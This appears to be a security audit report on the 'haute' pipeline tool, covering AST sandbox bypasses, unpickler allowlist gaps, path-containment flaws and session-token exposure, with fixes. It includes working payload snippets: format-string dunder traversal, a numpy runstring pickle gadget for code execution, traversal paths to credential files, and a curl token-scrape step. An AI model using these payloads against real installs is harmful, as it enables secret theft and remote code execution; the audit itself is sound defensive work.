findings.location: src/haute/_sandbox.py:239-243 (visit_Call only inspects ast.Name callees), 229-237 (visit_Attribute only sees literal dunder tokens), 102-109 ('format' present in _SAFE_BUILTINS); enabling sink _user_exec.py:51 exec(code, safe_globals(...), local_ns)
findings.title: AST blocklist bypassed by str.format / format_map / format() template attribute traversal — arbitrary attribute read (closure secrets, __globals__) from shared/node pipeline code
findings.description: The AST validator's entire dunder defence rests on seeing dunder names as literal `ast.Attribute.attr` tokens (`_BLOCKED_ATTRS`, `_BLOCKED_FRAME_ATTRS`) and blocked builtins as literal `ast.Name` call targets (`_BLOCKED_CALLS`). Python's string-formatting mini-language performs full attribute AND index traversal driven by a runtime *template string* that the AST never parses. `"{0.__closure__[0].cell_contents}".format(obj)`, `"{x.__globals__}".format_map({'x': obj})`, and `format(obj, spec)` therefore reach blocked dunders without ever emitting a blocked token. `str.format`/`format_map` are method calls whose callee is an `ast.Attribute`, so `visit_Call` (which only checks `isinstance(node.func, ast.Name)`) never inspects them, and the builtin `format` is left in `_SAFE_BUILTINS` (not in `_BLOCKED_BUILTINS`). I verified against the real `validate_user_code`/`safe_globals`: `"{0.__closure__[0].cell_contents}".format(helper)` PASSES validation and at runtime returns the closure secret `SECRET-TOKEN-12345`, while the byte-identical normal access `helper.__closure__[0].cell_contents` is BLOCKED with UnsafeCodeError. `"{0.__globals__}".format(fn)` dumps the function's entire module globals dict (rendered to string, including the `__builtins__` entry). This is a clean, reliable read-primitive escape of the documented sandbox. It is bounded to INFO-LEAK (not RCE): `format()` coerces every field to `str`, so it cannot invoke methods or return live objects, and I confirmed no live-attribute or eval primitive remains in the restricted builtins (`getattr`/`vars`/`dir`/`type`/`hasattr`/`eval`/`exec`/`compile`/`__import__` are all removed), and `string.Formatter` is not importable. So the leaked `__globals__`/`__subclasses__()` text is a string, not a callable, and cannot be re-entered to execute code through pure formatting. Not previously reported (existing _sandbox findings cover the pickle allowlist breadth #59, the joblib find_class race V031, and the unbounded validation cache #60 — none mention format-string traversal).
findings.exploit_scenario: Ralph imports/opens a SHARED pipeline (or an imported submodel) authored by someone else. One of its polars/explore/externalFile nodes contains transform code such as `leak = '{0.__globals__}'.format(helper)` or `secret = '{0.__closure__[0].cell_contents}'.format(util_fn)`, where `helper`/`util_fn` is any in-scope callable — notably the preamble helper functions the executor injects into node code via `extra_ns`/`_preamble` (see _builders.py:599/692/724/831 and _user_exec.py:51), or `pl` internals. validate_user_code passes (no blocked token appears in the AST), exec runs, and the node's resulting `df`/value now embeds the stringified contents of that function's `__globals__` (module-internal paths, in-memory config, environment-derived constants) or a closure cell secret (e.g. a Databricks token captured in a preamble closure). The attacker exfiltrates it by writing it into an output column, a dataSink path, or any value the shared pipeline surfaces back to the operator. The AST sandbox — whose stated purpose (module docstring) is to 'close known CPython sandbox-escape vectors at the structural level' including '__class__, __subclasses__' — provides no protection against this read path.
findings.recommended_fix: Treat string-formatting attribute traversal as a first-class escape vector. Minimal hardening: (1) In `_ASTValidator.visit_Call`, also reject calls whose callee is an `ast.Attribute` with `attr in {'format', 'format_map', 'format_field', 'vformat', 'get_field'}` (the str/Formatter traversal surface), and add `format` to `_BLOCKED_BUILTINS`/`_BLOCKED_CALLS`. (2) Because `"...".format(...)` on a literal is the common legitimate case, prefer parsing format-template string constants: walk every `ast.Constant`/`JoinedStr` that is the receiver of a `.format`/`.format_map` call and run the field-name/`{x.attr}` parts through the same `_BLOCKED_ATTRS`/`_BLOCKED_FRAME_ATTRS` check (use `string.Formatter().parse` to extract `field_name`, then reject any `.__dunder__` or `[...]` segment touching a blocked attr). (3) Add adversarial regression tests mirroring the existing TestFormatStringExploitation class but for `str.format`/`format_map`/`format()` template traversal (closure leak, __globals__ leak, __subclasses__ enumeration) asserting UnsafeCodeError. The deeper fix is to move off the denylist (see boundary_assessment): an allowlist AST (permit only a vetted set of node types/attributes) would make this whole class unrepresentable.

findings.title: AST validator is a denylist with several reachable-but-unblocked dunders (__getattribute__, __base__, __subclasshook__, __class_getitem__, __getstate__/__setstate__, __init__) — fragile by construction
findings.description: The sandbox is structurally a DENYLIST: `visit_Attribute` only rejects names present in the hand-maintained `_BLOCKED_ATTRS`/`_BLOCKED_FRAME_ATTRS` sets, and everything else is permitted. I empirically confirmed (against the real validator) that the following dunders PASS validation today: `__getattribute__` (the sibling of the blocked `__getattr__`, and a general attribute-read primitive), `__base__` (singular form of the blocked `__bases__`), `__subclasshook__`, `__class_getitem__`, `__getstate__`/`__setstate__`, `__call__`, `__delitem__`, `__objclass__`, `__defaults__`/`__kwdefaults__`, `__wrapped__`, plus the already-test-documented `__init__`/`__qualname__`/`__annotations__`/`__name__`. Individually most are low value while the runtime builtins stay locked (no `getattr`/`eval`/`type` to convert a read into execution), and the format-string vector (separate finding) already grants full read traversal, so these are not independently critical. They are reported as a class to document that the denylist has demonstrable holes and is inherently incomplete: every future CPython version that adds a dunder, and every traversal helper not enumerated, is permitted by default. This is the architectural weakness behind the format-string finding.
findings.exploit_scenario: A shared/imported pipeline node uses `obj.__getattribute__('__class' + '__')`-style or `cls.__base__`/`__subclasshook__` traversal to walk toward interesting objects. With the current locked runtime builtins this stays a read/leak rather than RCE, but it widens the leak surface beyond what the blocklist authors enumerated, and any future relaxation of the runtime builtins (e.g. someone adds `getattr` back for ergonomics, or an `allow_imports`-style flag spreads) immediately turns these permitted reads into an execution chain. The danger is the maintenance burden: the protection silently weakens as Python evolves, with no test that fails when a new escape-relevant dunder appears.
findings.recommended_fix: Invert the model to an ALLOWLIST where feasible: in `visit_Attribute`, reject ALL names matching `^__.*__$` except a small vetted allowlist of provably-safe dunders actually needed by pipeline code (e.g. `__len__`); this single change subsumes the entire current `_BLOCKED_ATTRS` set and closes the whole future-dunder class at once (the existing tests for `__init__`/`__qualname__`/etc. being 'allowed' would need re-evaluation — those allowances are themselves a liability). If staying with a denylist short term, at minimum add `__getattribute__`, `__base__`, `__subclasshook__`, `__class_getitem__`, `__getstate__`, `__setstate__`, `__call__`, `__objclass__` to `_BLOCKED_ATTRS`, and add a CI test that enumerates `dir(object)`/`dir(type)`/function/generator dunders and asserts every escape-relevant one is blocked, so a Python upgrade that introduces a new traversal dunder fails loudly.

results.boundary_assessment: GENUINELY WEAK for shared/imported content; adequate-only-for-strict-trusted-operator. The boundary is fundamentally a DENYLIST applied at the AST level plus a restricted-builtins backstop. The restricted-builtins layer is the genuinely strong part: with getattr/vars/dir/type/hasattr/eval/exec/compile/__import__/open all removed and __builtins__ pointing at the restricted dict, I could NOT escalate any read primitive to code execution from pure node code (string.Formatter unimportable, format() returns strings not live objects), so the catastrophic RCE class via the AST path appears contained for the no-allow_imports node path. That backstop is doing the real work. The AST blocklist itself, however, is demonstrably incomplete and fragile: I confirmed a clean bypass of the ENTIRE dunder defence via str.format/format_map template traversal (closure-secret and __globals__ leak both reproduced, byte-identical normal access blocked), and multiple escape-relevant dunders (__getattribute__, __base__, __subclasshook__, __class_getitem__, __getstate__/__setstate__) pass validation. So: as a defence-in-depth INFO-LEAK boundary it is weak — once a pipeline/submodel is shared or imported (an explicitly in-scope threat per the task), untrusted node code can read arbitrary in-scope attributes (including preamble-injected helper closures/globals that may hold tokens) and exfiltrate them. As an RCE boundary for the node path it currently holds only because the runtime-builtins allowlist is strict; that is a single load-bearing layer, and the denylist provides little independent assurance. Two caveats I deliberately did NOT inflate: (a) the preamble path (executor.py:297/367, cli/_train.py:74) runs with allow_imports=True and is full RCE by design — but that is the operator's own top-of-file code (documented), not attacker-influenced node code, so I did not flag it as a vuln; (b) the pickle/joblib artifact-loading surface is already covered by existing findings (#59, V031) and I did not re-report it. Recommendation: move the attribute check to an allowlist and parse format-template strings; treat the AST layer as untrustworthy until then and lean on the restricted builtins as the primary control.

GENUINELY WEAK — and weaker than the existing review concluded. The RestrictedUnpickler is the codebase's primary defense for deserializing model artifacts (reached from _io.py load_external_object at _builders.py:723 dev-exec and deploy/_scorer.py:510 bundle-remap; safe_unpickle/safe_joblib_load both route find_class through _pickle_global_is_allowed). Its allowlist is built from whole-package single-segment prefixes — ('numpy',), ('scipy',), ('sklearn',), ('pandas',), ('joblib',), ('collections',), plus ('copyreg',)/('_codecs',). find_class is the ONLY gate, and pickle's REDUCE opcode still invokes whatever callable find_class returns with attacker-controlled arguments. The pre-existing finding #59 documented this breadth but EXPLICITLY concluded the RCE class is contained ("the catastrophic RCE class is contained; only allowlisted ML-library object construction is not", severity low) because os/subprocess/posix are not allowlisted. That conclusion is factually wrong: the whole-package numpy entry admits direct code-execution gadgets. I proved full arbitrary code execution end-to-end through BOTH safe_unpickle and safe_joblib_load on this repo's own runtime (numpy 2.4.2) using a single allowlisted global, numpy.testing._private.utils.runstring (whose body is literally `exec(astr, dict)`). So the boundary is not adequate-for-local-trust the moment a pickle/joblib artifact is attacker-influenced (a shared pipeline's bundled .pkl/.joblib, an imported submodel artifact, a deploy bundle). The non-pickle MLflow paths in _mlflow_io.py (native .cbm CatBoost loader, native .rsglm RustyStats, and mlflow.pyfunc.load_model) do NOT route through the RestrictedUnpickler at all — pyfunc uses MLflow's own unrestricted loading, which is standard-but-unguarded, but the sharp, in-scope NEW issue is that the allowlist itself is a paper wall. Recommended posture: stop relying on module-prefix allowlisting; pin an explicit (module, qualname) allowlist of the concrete classes actually persisted, and add artifact integrity/provenance (signed manifest or pinned content-hash allowlist) before any shared/imported artifact is loaded.

findings.location: src/haute/_sandbox.py:346-394 (_ALLOWED_PICKLE_PREFIXES single-segment ('numpy',) entry + _pickle_global_is_allowed prefix match); gate at 405-413 (_RestrictedUnpickler.find_class) and 454-463 (joblib find_class); reached via safe_unpickle 416-425 / safe_joblib_load 431-472
findings.title: RestrictedUnpickler allowlist admits real RCE gadgets via whole-package numpy entry — arbitrary code execution through safe_unpickle AND safe_joblib_load (not merely object construction)
findings.description: The pickle allowlist is built from whole-package single-segment prefixes. _pickle_global_is_allowed('numpy', <anything>) and _pickle_global_is_allowed('numpy.<any.submodule>', <anything>) return True — find_class filters ONLY by module prefix, never by qualname. The numpy package tree contains direct code-execution primitives reachable as pickle globals, and pickle's REDUCE opcode invokes whatever callable find_class returns with attacker-controlled arguments. The cleanest gadget is numpy.testing._private.utils.runstring, whose entire body is `def runstring(astr, dict): exec(astr, dict)` — i.e. it IS exec, with both arguments attacker-supplied. numpy.testing ships with base numpy (no dev/test extra; confirmed importing on this repo's runtime, numpy 2.4.2), so it is present in every haute install. A second gadget, numpy.distutils.exec_command.exec_command, spawns a subprocess (works on Python < 3.12). I verified end-to-end on this machine: a pickle whose ONLY global is ('numpy.testing._private.utils','runstring') — confirmed via pickletools.genops, all globals allowlisted=True — when loaded through the real safe_unpickle executed `import os; open(sentinel,'w').write('rce:'+str(os.getpid()))`, writing a sentinel file containing the live PID. The identical payload loaded through safe_joblib_load (which patches joblib's NumpyUnpickler.find_class with the same allowlist) ALSO executed and wrote its sentinel. Note 'os' never appears as a pickle global — it is imported inside the exec'd string — so module-name allowlisting cannot see it. This directly refutes existing finding #59's conclusion that 'the catastrophic RCE class is contained; only allowlisted ML-library object construction is not.' #59 demonstrated only forged-estimator state injection and assumed no exec/subprocess primitive was reachable; this finding shows a single allowlisted global yields full arbitrary code execution. This is a NEW, distinct, and far more severe issue than #59's construction/state-injection.
findings.exploit_scenario: An externalFile node carries a `path` + `fileType` ('pickle' or 'joblib') in pipeline/submodel config. In the trust model's SHARED/imported-pipeline and deploy-bundle cases, the artifact bytes at that path cross a trust boundary: (a) a shared pipeline ships a bundled freq.pkl/model.joblib next to its config; (b) an imported submodel references an attacker-authored artifact; (c) the deploy scorer (src/haute/deploy/_scorer.py:510) loads a REMAPPED MLflow bundle artifact via load_external_object after unpacking it from the registry. The attacker crafts the .pkl/.joblib so its __reduce__ returns (numpy.testing._private.utils.runstring, ('<arbitrary python>', {})). The victim merely runs/previews the shared pipeline (dev executor: src/haute/_builders.py:723 -> load_external_object -> safe_unpickle/safe_joblib_load) or serves the deployed model. validate_project_path only checks the path resolves inside the project root — it does not inspect bytes — and the RestrictedUnpickler waves the single numpy global through. The embedded code runs with the operator's full privileges (read .env/Databricks tokens, exfiltrate data, modify rating logic, drop a backdoor). No os/subprocess/eval global appears in the pickle, so any audit that greps the artifact for obvious RCE module names sees nothing. The operator believes the 'restricted' unpickler protected them.
findings.recommended_fix: Stop allowlisting by module prefix; whole-package entries are unsafe because large library trees inevitably contain exec/subprocess/loader gadgets (numpy.testing.runstring, numpy.distutils.exec_command, numpy.ctypeslib.load_library, pandas.core.computation.eval.eval, etc.). Replace _ALLOWED_PICKLE_PREFIXES with an explicit, exhaustive set of (module, qualname) pairs for the concrete classes actually persisted by haute's own save paths (e.g. numpy._core.multiarray._reconstruct / ndarray / dtype, the specific sklearn estimator classes used, scipy.sparse matrix types, the catboost/rustystats wrappers) and reject every other qualname — including ones under numpy/sklearn/etc. As defense-in-depth and the real fix for attacker-influenced artifacts, add integrity/provenance verification before loading any pickle/joblib that can cross a trust boundary: sign the deploy/import bundle manifest, or pin an allowlist of artifact content-hashes captured at build/registration time (content_hash in _io.py is currently a cache key only, not an authenticity check). Where feasible, migrate persisted estimator state to a non-code-bearing format. Add a regression test that asserts safe_unpickle/safe_joblib_load BLOCK a payload whose sole global is numpy.testing._private.utils.runstring (and numpy.distutils.exec_command.exec_command), proving the gadget class is rejected rather than merely that os.system is rejected.
findings.category_note: Verified end-to-end on repo runtime; sentinel file written with live PID via both safe_unpickle and safe_joblib_load. Distinct from existing finding #59 (object construction/state injection, which concluded RCE was contained).

findings.title: Route input-path guard omits modelScore feature_contract_path / artifact_path, so even guarded preview/trace/sink routes read an out-of-root file with zero containment
findings.description: The HTTP route guard `_validate_runtime_input_paths` (called by the preview, trace, and sink routes) only enforces project-root containment for the `path` field of apiInput/dataSource/externalFile nodes plus `artifact_path` of file-sourced optimiserApply nodes. Its coverage map `_RUNTIME_INPUT_PATH_CONFIG_BY_NODE_TYPE` does NOT include MODEL_SCORE at all. Yet the executor's own field map `_LOCAL_RUNTIME_INPUT_PATH_FIELDS_BY_NODE_TYPE[NodeType.MODEL_SCORE] = ('artifact_path','feature_contract_path')` shows the engine treats both modelScore file fields as runtime inputs. `feature_contract_path` is read with NO containment anywhere in the chain: `_runtime_file_signature_paths` resolves it via `resolve_runtime_file_path(..., prefer='project')` (enforce_project_root defaults False) and then `_stat_gated_runtime_path_fingerprint` -> `_runtime_path_fingerprint` -> `content_hash(resolved)` reads the ENTIRE file to build the preview/trace cache key on every request; and during scoring `ModelScorer._categorical_levels_for_score` calls `load_contract(self.feature_contract_path)` which does `Path(path).read_text()`. I confirmed by code-path tracing and isolated execution that (a) `_validate_runtime_input_paths` PASSES a modelScore node whose `feature_contract_path` is an absolute out-of-root path, and (b) `load_contract` opens and JSON-parses that out-of-root file (the resulting FeatureMismatchError for 'missing required fields' proves the file was read). This is distinct from prior finding #30 / platform__executor-path-resolution-no-enforce-project-root: that finding is about the `path` field on dataSource/apiInput/externalFile and about the train/optimiser routes lacking the guard ENTIRELY; it does not identify that the guard's coverage map itself omits modelScore, so the gap exists even on the routes that DO call the guard.
findings.exploit_scenario: A user opens a SHARED/imported pipeline `.py` (or its serialized graph) authored by an attacker. It contains a modelScore node with `sourceType` configured and `feature_contract_path` set to an absolute out-of-project path such as `/home/op/.aws/credentials`, `C:\Users\op\.ssh\id_rsa`, or a sibling project's secret contract. The operator clicks Preview or Trace on a node downstream of (or at) that modelScore node. The preview route calls `_validate_runtime_input_paths`, which passes the node unchecked (modelScore not in its map). The executor then content-hashes the out-of-root file to compute the cache key, and scoring calls `load_contract`, both reading the file. Although the file content is not directly returned, its bytes influence the cache fingerprint and any contract-shape mismatch is surfaced verbatim in the HTTP error (path + parsed structure), and the read itself can be used as an existence/size oracle and to trigger reads of arbitrary host files from a route the operator believes is path-contained.
findings.recommended_fix: Make containment a property of the execution boundary, not a per-route allow-map. Concretely: (1) replace the route guard's hand-maintained `_RUNTIME_INPUT_PATH_CONFIG_BY_NODE_TYPE` with the executor's authoritative `_runtime_file_signature_paths` / `_runtime_input_path_fields` enumeration so the guard validates exactly the fields the engine reads (including modelScore `artifact_path`/`feature_contract_path`); (2) add an `is_relative_to(_get_project_root())` gate inside `load_contract`/`load_contract_cached` (or resolve `feature_contract_path` through `resolve_runtime_file_path(..., enforce_project_root=True)` before reading), so the read fails loudly even when reached from the unguarded train/optimiser routes; (3) per CLAUDE.md, add a failing test first: a preview/trace request with a modelScore node whose feature_contract_path is out-of-root must 403, mirroring tests/test_pipeline_runtime_path_validation.py.
findings.boundary_note: Reachable on the guarded routes that are explicitly supposed to be contained; arbitrary host-file content read/oracle when a pipeline is shared/imported.

findings.title: _normalise_path_text backslash->slash rewrite diverges from the executor read guard on POSIX and corrupts Windows extended-length/device paths
findings.location: src/haute/_path_resolution.py:11-21 (_normalise_path_text) used by resolve_runtime_file_path:86-99; contrast src/haute/_io.py:141-147 (_validate_source_path uses Path(path).parts with NO backslash normalisation) and src/haute/routes/_helpers.py:78-102 (validate_safe_path also does not normalise backslashes)
findings.description: `_normalise_path_text` unconditionally does `text.replace('\\','/')` on every platform before constructing the Path. This creates two problems. (A) Cross-platform divergence: on POSIX a backslash is a legal filename character, so the route guard `resolve_runtime_file_path` (which calls `_normalise_path_text`) interprets `..\..\etc\passwd` as the traversal `../../etc/passwd` (`..` IS in parts), whereas the executor's actual flat-file read guard `_io._validate_source_path` does `Path(path_string).parts` WITHOUT normalising backslashes, so on POSIX it sees a single literal filename `'..\..\etc\passwd'` with `..` NOT in parts and admits it. The two guards therefore disagree about the same string on POSIX, so reasoning about one does not bound the other. (B) Windows extended-length/device paths break: `\\?\C:\Windows\...` and `\\.\C:\...` become `/?/C:/Windows/...` / `/./C:/...`, which PureWindowsPath parses as RELATIVE (is_absolute()=False) with a literal `?` component, so resolve_runtime_file_path joins them UNDER the project root and `enforce_project_root=True` returns a silently-wrong in-root path instead of the intended absolute path. I verified all of this by direct execution.
findings.exploit_scenario: On a Linux/macOS deployment, a shared pipeline graph carries a dataSource whose config.path contains backslashes. Whichever boundary the reviewer trusts to be authoritative (the enforce=True route guard vs the executor's `_validate_source_path`) interprets the path differently, so a path crafted to look benign to one layer is interpreted as traversal-or-literal by the other. Combined with the executor's enforce-default-False read path (prior finding #30), the divergence widens the set of strings whose containment outcome differs between validation and the actual read. The Windows `\\?\` case is primarily a correctness/robustness defect (the operator's intended absolute path silently becomes an in-root path), but it means containment decisions are made on a mangled path.
findings.recommended_fix: Do not rewrite backslashes on POSIX. Gate the replacement on `os.name == 'nt'` (or use `os.sep`/`PureWindowsPath` only when running on Windows), and reject UNC/extended-length/device prefixes explicitly rather than mangling them. Make the route guard and `_io._validate_source_path` share a single normalisation+containment helper so the two boundaries can never interpret the same string differently.
findings.boundary_note: Pure local-trust happy path is unaffected; the divergence and parse corruption only bite once a path string is attacker-influenced (shared/imported pipeline) and especially on POSIX.

findings.title: is_relative_to containment is case-sensitive on POSIX but macOS/APFS is case-insensitive, so case-variant paths in a shared pipeline can bypass containment on macOS
findings.description: All three containment primitives gate on `resolved.is_relative_to(root)`. `pathlib.PurePosixPath.is_relative_to` is case-SENSITIVE (verified: `PurePosixPath('/PROJ/secret').is_relative_to('/proj')` is False), while `PureWindowsPath.is_relative_to` is case-insensitive. On Windows, `Path.resolve()` also canonicalises case to the real on-disk casing (verified), so case games do not help an attacker there. On macOS, however, the default APFS volume is case-INSENSITIVE while Python treats paths with POSIX (case-sensitive) semantics, and `os.path.realpath` on macOS does not correct the case of existing components. The net effect is that on macOS two strings that the filesystem treats as the same location can compare as different under `is_relative_to`. Depending on how the project root string was captured (its casing) versus the casing of a crafted candidate, a containment check can yield a result that does not match the filesystem's actual notion of inside/outside, undermining the invariant that `is_relative_to(root)` means 'the same subtree the OS will open'. I could not execute the macOS-specific case-fold behaviour on this Windows host, hence low confidence; the POSIX case-sensitivity of is_relative_to is verified.
findings.exploit_scenario: A pipeline is authored/imported on a case-insensitive macOS install. The project root is recorded as `/Users/op/Proj`. A shared graph references a file whose path is spelled with a different case for the root prefix (e.g. `/users/op/proj_secret/leak.csv` or a casing that makes `is_relative_to` of a sibling directory like `/Users/op/ProjEvil` compare inside/outside incorrectly). Because the FS resolves casings loosely but the containment check compares case-sensitively, the validated decision can diverge from what the OS actually opens, letting a path the operator believes is contained resolve to a different real location (or vice-versa, breaking a legitimate path).
findings.recommended_fix: Do not rely on `is_relative_to` string comparison as the security boundary on case-insensitive filesystems. Compare using `os.path.commonpath` on `os.path.normcase`-folded, fully-realpath'd paths, or canonicalise both root and candidate through `os.path.realpath` + `os.path.normcase` before the prefix check, so the comparison matches the host filesystem's case semantics on every platform. Add a macOS CI matrix entry that asserts a case-variant out-of-root path is rejected.
findings.boundary_note: Cross-platform robustness gap that only matters once paths are attacker-influenced AND the host FS is case-insensitive (macOS default, some Windows network shares); solid on case-sensitive Linux and on Windows (where resolve() folds case).

findings.title: Project-root sandbox is silently whatever cwd `haute serve` was launched from; set_project_root is never called in production, so the containment scope follows the launch directory
findings.location: src/haute/_sandbox.py:43-57 (_PROJECT_ROOT / _get_project_root / set_project_root); src/haute/cli/_serve.py:443-506 (uvicorn.run with no chdir / no set_project_root); consumers: routes/pipeline.py:383 (validate_safe_path(_get_project_root(),...)), _sandbox.safe_unpickle/safe_joblib_load:423,443
findings.description: `_get_project_root()` lazily caches `Path.cwd().resolve()` on first access and is the root for `validate_project_path` (safe_unpickle/safe_joblib_load), `validate_safe_path` (the file-browser route), and the inferred root in `resolve_runtime_file_path` when no project_root is supplied. `set_project_root` exists to pin this explicitly, but a full-tree grep shows it is called ONLY from tests/CLI-doc intent and NEVER from any production entry point: `haute serve` (cli/_serve.py) launches `uvicorn.run('haute.server:app', ...)` with no chdir and no `set_project_root`. Consequently the entire path-containment boundary is defined implicitly by the directory the operator happened to be in when they started the server. If `haute serve` is run from a broad directory (the user's home directory, or a drive root such as `C:\` / `/`), the 'project root' becomes that whole subtree and containment degrades toward a no-op; the file-browser route and unpickle path validation then permit traversal anywhere under that broad root.
findings.exploit_scenario: An operator starts `haute serve` from their home directory (a common convenience) rather than from a tight project folder. `_get_project_root()` caches `~`. A shared pipeline or a request to the file-browser/preview endpoints can now reference any file anywhere under `~` (SSH keys, browser profiles, other projects' secrets) and pass every containment check, because they are all 'inside the project root'. Because there is no explicit, narrow project root tied to `haute.toml`'s location, the security scope silently tracks the launch cwd rather than the project, and nothing warns the operator that the boundary just expanded.
findings.recommended_fix: Pin the project root explicitly at server startup from the resolved location of `haute.toml` (the same anchor `pipeline_dir()` already uses) by calling `set_project_root(haute_toml_dir)` in `handle_serve`/app startup, instead of falling through to `Path.cwd()`. Fail loudly (or emit a structured warning) if the resolved root is a filesystem root or the user home directory. This narrows containment to the actual project regardless of launch cwd and removes the silent dependency on where the process was started.
findings.boundary_note: Adequate for the disciplined trusted-operator who always launches from a tight project dir; becomes a real over-broadening of the sandbox the moment the operator launches from home/root or relies on the boundary while browsing/importing shared content.

results.boundary_assessment:
Adequate-for-local-trust, but with one genuinely-weak seam that breaks the moment pipeline content is shared/imported. The core primitives (validate_project_path, validate_safe_path, resolve_runtime_file_path with enforce_project_root=True) are individually reasonable: they resolve symlinks before the is_relative_to gate (so an in-root symlink to an outside target is correctly rejected), they reject UNC and foreign-drive absolute paths under enforce=True, and they fail loudly on embedded NUL. The well-known weakness that the executor's enforce_project_root default is False and the train/optimiser routes skip the guard entirely is already documented (prior finding #30) and not re-reported here.

The new, material problem is that containment is implemented as a SET OF PER-CALL-SITE GUARDS rather than a property of the read/execution boundary, and the guard set is incomplete: the route input-path guard's node/field coverage map omits modelScore feature_contract_path, which the engine reads (and content-hashes) with zero containment on the very routes that are supposed to be contained (Finding 1, high). That is a real arbitrary-host-file read/oracle reachable from a shared pipeline through a guarded route. Around it sit three lower-severity robustness gaps that all share the same root cause — the boundary trusts string/path comparisons that are not platform-faithful or not authoritative: the unconditional backslash rewrite that diverges from the executor's own read guard on POSIX and mangles Windows \\?\ paths (Finding 2), the case-sensitive is_relative_to versus case-insensitive macOS/Windows-share filesystems (Finding 3), and the cwd-cached project root that silently scopes the entire sandbox to wherever the server was launched because set_project_root is never called in production (Finding 4).

Honest bottom line: for a single trusted operator who launches from a tight project directory on Linux and never imports a hostile pipeline, this boundary holds. But the design relies on every individual call site remembering to opt into containment with the right fields and the right platform semantics, and at least one important call site (modelScore contract reads) does not. The robust fix is to centralise containment at the file-open/execution boundary (resolve through one enforce=True helper, gate load_contract, drive the route guard from the executor's authoritative field enumeration, pin the root to haute.toml) so it cannot be bypassed by any current or future caller. Until then, treat shared/imported pipelines and the file-browser route as able to read host files outside the intended project tree.

ADEQUATE-FOR-LOCAL-TRUST at the default loopback bind, but with one genuinely-weak edge that bites the moment the server is exposed (a supported, warned-about mode) or content/links are shared. The auth core is well-built and I confirmed several things are SOLID (not findings): (1) token comparison uses hmac.compare_digest — constant-time (_local_security.py:155); (2) Origin parsing in _origin_host/_normalise_host_value correctly defeats userinfo (`http://localhost@evil.com` -> host evil.com), suffix (`http://localhost.evil.com` -> not local), and `null`/`file://` origins (-> '' -> not local) — verified empirically; (3) HTTP /api/* is CSRF-safe: a foreign Origin is rejected (403) BEFORE the token check, and the token must travel in a custom header (x-haute-session-token) which a cross-site browser request cannot set without a CORS preflight that is not granted in prod mode, so `/
` GET and cross-site fetch cannot forge authenticated /api calls; (4) the WebSocket Origin check does block browser cross-site WebSocket hijacking because browsers always send Origin on WS handshakes; (5) middleware order is correct (LocalTrustedHostMiddleware outermost -> LocalSessionMiddleware -> _RequestIdMiddleware); (6) the OPTIONS bypass (line 182-183) is fine because the Origin gate runs first and no /api route performs state changes on OPTIONS; (7) the HAUTE_DISABLE_LOCAL_SESSION_AUTH hatch is internally consistent (token blanked in the served HTML, ensure_local_session_token_env returns '' so children inherit no token). Already-documented weaknesses I did NOT re-report: token accepted as a WS URL query param + absent-Origin treated as trusted (catalog #747 / repro platform__local-security-session-token-in-query-string.py), wildcard trusted-host case-sensitivity (B067 line 845), non-canonical IPv6 loopback Origin rejected (B067 line 855), x-request-id reflection/log-injection (catalog #64). The NEW issue below is the missing link that escalates #747 from a theoretical leak into turnkey unauthenticated token disclosure once bound non-loopback: the SPA index route dispenses the live session token with no Origin and no token gate. Net: SOLID for the trusted single-operator loopback happy path; genuinely WEAK as soon as `--host 0.0.0.0`/a LAN IP is used or the token-bearing page/URL is shared.

findings.location: src/haute/server.py:707-730 (serve_spa + _serve_index_html); gate-bypass roots at src/haute/_local_security.py:173 (LocalSessionMiddleware only guards paths under /api/) and src/haute/server.py:709-710 (token embedded in HTML)
findings.title: SPA index route serves the live session token to any client without Origin or token authentication, escalating the documented 'leakable secret' into turnkey unauthenticated token disclosure once bound non-loopback
findings.description: The whole local-auth design rests on a single per-process secret: every /api/* route and the /ws/sync WebSocket require the session token (LocalSessionMiddleware._token_matches / websocket_rejection_reason). But the token is itself dispensed, with NO authentication, by the SPA catch-all. _serve_index_html() (server.py:707-719) embeds the live token verbatim as `<script>window.__HAUTE_SESSION_TOKEN__ = "<token>"</script>`, and serve_spa (server.py:721-730) returns that HTML for `/` and EVERY non-file, non-/api path. LocalSessionMiddleware.dispatch (_local_security.py:173) short-circuits (`return await call_next(request)`) for any path that does not start with `/api/`, BEFORE the Origin check and BEFORE the token check. So the index route applies neither gate. The only filter in front of it is LocalTrustedHostMiddleware (the Host header). I confirmed end-to-end with a Starlette TestClient: `GET /` (and `GET /any/spa/route`) with a valid Host (`localhost`/`127.0.0.1`), a FOREIGN Origin, and NO session token returns 200 with the token in the body, while `GET /api/session` without the token returns 403 — the protection is asymmetric (the API is gated; the thing that hands out the API's key is not). This is distinct from the already-catalogued findings: catalog #747 covers the token being accepted as a WS query param and absent-Origin being trusted (i.e. how a token, once known, can be replayed and how a leaked URL leaks it); the existing serve_spa finding (B041) is only about symlinked-install path resolution. Neither notes that the index route HANDS OUT the token with no auth. Additionally, because the token is inlined into HTML, any future same-origin XSS or a browser extension reading window.__HAUTE_SESSION_TOKEN__ obtains the full credential, and an intermediary/forward proxy in front of an exposed instance could cache the token-bearing HTML for other clients (the response sets Cache-Control: no-store, which mitigates shared-cache reuse but not proxy logging or a misbehaving cache).
findings.exploit_scenario: The operator follows a supported path and runs `haute serve --host 0.0.0.0` (or `--host <LAN-IP>`) to reach the editor from another device — the CLI prints an exposure warning but proceeds. _trusted_hosts_for_bind('0.0.0.0') returns '*', so LocalTrustedHostMiddleware.allow_any is True and accepts ANY Host (verified: `_trusted_hosts_for_bind('0.0.0.0') == '*'`; with HAUTE_TRUSTED_HOSTS='*', `GET /` with an arbitrary Host `victim-laptop.lan`, a foreign Origin and no token returns 200 with the token in the body). A second machine on the same network (a co-worker's laptop, a compromised IoT device, a guest on the office Wi-Fi) does `curl http://<victim-ip>:8000/`, scrapes `window.__HAUTE_SESSION_TOKEN__` from the returned HTML — no auth, no Origin, no prior knowledge — and now holds the sole credential. It replays the token in the x-haute-session-token header against /api/* (and/or the ?haute_session_token= WS query param) to create/edit/run pipelines, which execute attacker-authored Python in-process and write files (full RCE on the operator's machine). For a specific-IP bind the chain is identical: trusted hosts include that IP, so `Host: <LAN-IP>` passes. This converts catalog #747 from 'the secret can leak via logs/referrer' into 'the server gives the secret to anyone who can open a TCP socket', removing the need for any incidental leak. (At the DEFAULT loopback bind the same code path still serves the token ungated, but SOP/CORS stop a remote browser from reading the cross-origin body and loopback-only binding stops a remote socket — so default config is defense-in-depth-weak rather than remotely exploitable.)
